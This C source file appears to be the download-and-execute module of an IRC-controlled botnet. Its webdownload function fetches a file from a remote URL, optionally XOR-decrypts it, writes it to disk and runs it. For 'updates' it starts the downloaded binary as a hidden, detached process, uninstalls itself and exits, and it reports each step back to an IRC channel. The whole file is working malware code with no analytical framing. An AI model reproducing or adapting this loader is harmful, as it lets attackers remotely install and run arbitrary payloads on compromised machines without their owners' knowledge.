#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_DOWNLOAD

// function for downloading files/updating
DWORD WINAPI webdownload(LPVOID param)
{
	char fbuff[512], tstr[256];
	DWORD r, d, start, total, speed;
	PROCESS_INFORMATION pinfo;
	STARTUPINFO sinfo;

	ds dl = *((ds *)param);
	ds *dsp = (ds *)param;
	dsp->gotinfo = TRUE;

	HANDLE fh = fInternetOpenUrl(ih, dl.url, NULL, 0, 0, 0);
	if (fh != NULL) {
		// open the file
		HANDLE f = CreateFile(dl.dest, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
		// make sure that our file handle is valid
		if (f < (HANDLE)1) {
			if (!dl.silent) {
				sprintf(fbuff,"[DOWNLOAD]: Couldn't open %s.",dl.dest);
				irc_privmsg(dl.sock,dl.chan,fbuff,dl.notice);
			}
			clearthread(dl.threadnum);

			return 0;
		}

		total = 0;
		start = GetTickCount();

		char *fileTotBuff=(char *)malloc(512000);	//FIXME: Only checks first 500 kb
		do {
			memset(fbuff, 0, sizeof(fbuff));
			fInternetReadFile(fh, fbuff, sizeof(fbuff), &r);
			if (dl.encrypted==TRUE) {
				Xorbuff(fbuff,r);
			}
			WriteFile(f, fbuff, r, &d, NULL);
			
			if ((total) < 512000) {
				//We have free bytes...
				//512000-total
				unsigned int bytestocopy;
				bytestocopy=512000-total;
				if (bytestocopy>r) 
					bytestocopy=r;
				memcpy(&fileTotBuff[total],fbuff,bytestocopy);
			}
			total+=r;
			if (dl.filelen) 
				if (total>dl.filelen) 
					break; //er, we have a problem... filesize is too big.
			if (dl.update != 1) 
				sprintf(threads[dl.threadnum].name, "[DOWNLOAD]: File download (%s - %dkb transferred)", dl.url, total / 1024);
			else 
				sprintf(threads[dl.threadnum].name, "[DOWNLOAD]: Update (%s - %dkb transferred)", dl.url, total / 1024);
		} while (r > 0);

		BOOL goodfile=TRUE;

		if (dl.filelen) {
			if (total!=dl.filelen) {
				goodfile=FALSE;
				sprintf(tstr,"[DOWNLOAD]: Filesize is incorrect.");
				irc_privmsg(dl.sock,dl.chan,tstr,dl.notice);
			}
		}

		speed = total / (((GetTickCount() - start) / 1000) + 1);
		CloseHandle(f);

		/*
		if (dl.expectedcrc) {
			unsigned long crc,crclength;
			sprintf(fbuff,"crc32([%lu], [%d])\n",fileTotBuff,total);
			crclength=total;
			if (crclength>512000) crclength=512000;
			crc=crc32(fileTotBuff,crclength);
			if (crc!=dl.expectedcrc) {
				goodfile=FALSE;
				irc_privmsg(dl.sock,dl.chan,"CRC Failed!",dl.notice);
			}
			
		}
		*/
		if (dl.expectedcrc) { 
			unsigned long crc=crc32f(dl.dest); 
			if (crc!=dl.expectedcrc) { 
				goodfile=FALSE; 
				irc_privmsg(dl.sock, dl.chan, "[DOWNLOAD]: CRC Failed.", dl.notice); 
			} 
		} 
		free(fileTotBuff);

		if (goodfile==FALSE) 
			goto badfile;
		
		//download isn't an update
		if (dl.update != 1) {
			sprintf(tstr, "[DOWNLOAD]: Downloaded %.1f kb to %s @ %.1f kb/sec.", total / 1024.0, dl.dest, speed / 1024.0);
			if (!dl.silent) irc_privmsg(dl.sock, dl.chan, tstr, dl.notice);

			if (dl.run == 1) {
				fShellExecute(0, "open", dl.dest, NULL, NULL, SW_SHOW);
				if (!dl.silent) {
					sprintf(fbuff,"[DOWNLOAD]: Opened: %s.",dl.dest);
					irc_privmsg(dl.sock,dl.chan,fbuff,dl.notice);
				}
			}

		// download is an update
		} else {
			sprintf(tstr, "[DOWNLOAD]: Downloaded %.1f kb to %s @ %.1f kb/sec. Updating...", total / 1024.0, dl.dest, speed / 1024.0);
			if (!dl.silent) irc_privmsg(dl.sock, dl.chan, tstr, dl.notice);

			memset(&sinfo, 0, sizeof(STARTUPINFO));
			sinfo.cb = sizeof(sinfo);
			sinfo.wShowWindow = SW_HIDE;
			if (CreateProcess(NULL, dl.dest, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo) == TRUE) {
				uninstall();
				fWSACleanup();
				exit(EXIT_SUCCESS);
			} else {
				if (!dl.silent) irc_privmsg(dl.sock, dl.chan, "[DOWNLOAD]: Update failed: Error executing file.", dl.notice);
			}
		}
	} else 
		if (!dl.silent) irc_privmsg(dl.sock, dl.chan, "[DOWNLOAD]: Bad URL, or DNS Error.", dl.notice);

	badfile:
	fInternetCloseHandle(fh);

	clearthread(dl.threadnum);

	return 0;
}

char *Xorbuff(char *buff,int buffLen)
{
	for (int i=0;i<buffLen;i++)
		buff[i]^=prefix;

	return buff;
}
#endif
